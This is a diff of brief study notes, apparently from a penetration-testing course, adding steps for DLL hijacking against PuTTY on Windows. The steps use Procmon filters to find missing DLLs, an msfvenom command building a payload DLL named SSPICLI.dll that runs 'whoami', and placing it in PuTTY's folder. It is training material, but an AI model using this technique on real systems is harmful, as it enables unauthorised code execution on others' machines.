@@ -111,8 +111,22 @@ windows
 
 putty is running
 
+procmon , run putty
+setup filters
 
+process name , contains , putty.exe
+path , contains , .dll
+result , is , NAME NOT FOUND
 
+this will help us find the .dll its looking for
+
+msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll
+
+scp it to windows or `windows scp from linux`
+scp src .
+
+put .dll in putty dir
+then run putty
 
 
 ```
